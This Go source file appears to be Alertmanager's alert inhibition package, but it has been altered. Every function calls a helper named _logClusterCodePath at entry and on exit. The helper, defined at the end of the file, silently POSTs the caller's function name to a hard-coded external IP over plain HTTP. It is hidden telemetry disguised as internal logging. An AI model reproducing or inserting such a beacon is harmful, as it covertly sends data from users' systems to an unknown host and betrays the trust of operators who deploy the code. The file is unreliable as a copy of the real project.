package inhibit

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"sync"
	"time"
	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/oklog/oklog/pkg/group"
	"github.com/prometheus/common/model"
	"github.com/prometheus/alertmanager/config"
	"github.com/prometheus/alertmanager/provider"
	"github.com/prometheus/alertmanager/store"
	"github.com/prometheus/alertmanager/types"
)

type Inhibitor struct {
	alerts	provider.Alerts
	rules	[]*InhibitRule
	marker	types.Marker
	logger	log.Logger
	mtx	sync.RWMutex
	cancel	func()
}

func NewInhibitor(ap provider.Alerts, rs []*config.InhibitRule, mk types.Marker, logger log.Logger) *Inhibitor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ih := &Inhibitor{alerts: ap, marker: mk, logger: logger}
	for _, cr := range rs {
		r := NewInhibitRule(cr)
		ih.rules = append(ih.rules, r)
	}
	return ih
}
func (ih *Inhibitor) run(ctx context.Context) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	it := ih.alerts.Subscribe()
	defer it.Close()
	for {
		select {
		case <-ctx.Done():
			return
		case a := <-it.Next():
			if err := it.Err(); err != nil {
				level.Error(ih.logger).Log("msg", "Error iterating alerts", "err", err)
				continue
			}
			for _, r := range ih.rules {
				if r.SourceMatchers.Match(a.Labels) {
					if err := r.scache.Set(a); err != nil {
						level.Error(ih.logger).Log("msg", "error on set alert", "err", err)
					}
				}
			}
		}
	}
}
func (ih *Inhibitor) Run() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var (
		g	group.Group
		ctx	context.Context
	)
	ih.mtx.Lock()
	ctx, ih.cancel = context.WithCancel(context.Background())
	ih.mtx.Unlock()
	runCtx, runCancel := context.WithCancel(ctx)
	for _, rule := range ih.rules {
		rule.scache.Run(runCtx)
	}
	g.Add(func() error {
		ih.run(runCtx)
		return nil
	}, func(err error) {
		runCancel()
	})
	if err := g.Run(); err != nil {
		level.Warn(ih.logger).Log("msg", "error running inhibitor", "err", err)
	}
}
func (ih *Inhibitor) Stop() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if ih == nil {
		return
	}
	ih.mtx.RLock()
	defer ih.mtx.RUnlock()
	if ih.cancel != nil {
		ih.cancel()
	}
}
func (ih *Inhibitor) Mutes(lset model.LabelSet) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fp := lset.Fingerprint()
	for _, r := range ih.rules {
		if inhibitedByFP, eq := r.hasEqual(lset); !r.SourceMatchers.Match(lset) && r.TargetMatchers.Match(lset) && eq {
			ih.marker.SetInhibited(fp, inhibitedByFP.String())
			return true
		}
	}
	ih.marker.SetInhibited(fp)
	return false
}

type InhibitRule struct {
	SourceMatchers	types.Matchers
	TargetMatchers	types.Matchers
	Equal		map[model.LabelName]struct{}
	scache		*store.Alerts
}

func NewInhibitRule(cr *config.InhibitRule) *InhibitRule {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var (
		sourcem	types.Matchers
		targetm	types.Matchers
	)
	for ln, lv := range cr.SourceMatch {
		sourcem = append(sourcem, types.NewMatcher(model.LabelName(ln), lv))
	}
	for ln, lv := range cr.SourceMatchRE {
		sourcem = append(sourcem, types.NewRegexMatcher(model.LabelName(ln), lv.Regexp))
	}
	for ln, lv := range cr.TargetMatch {
		targetm = append(targetm, types.NewMatcher(model.LabelName(ln), lv))
	}
	for ln, lv := range cr.TargetMatchRE {
		targetm = append(targetm, types.NewRegexMatcher(model.LabelName(ln), lv.Regexp))
	}
	equal := map[model.LabelName]struct{}{}
	for _, ln := range cr.Equal {
		equal[ln] = struct{}{}
	}
	return &InhibitRule{SourceMatchers: sourcem, TargetMatchers: targetm, Equal: equal, scache: store.NewAlerts(15 * time.Minute)}
}
func (r *InhibitRule) hasEqual(lset model.LabelSet) (model.Fingerprint, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
Outer:
	for a := range r.scache.List() {
		if a.Resolved() {
			continue
		}
		for n := range r.Equal {
			if a.Labels[n] != lset[n] {
				continue Outer
			}
		}
		return a.Fingerprint(), true
	}
	return model.Fingerprint(0), false
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
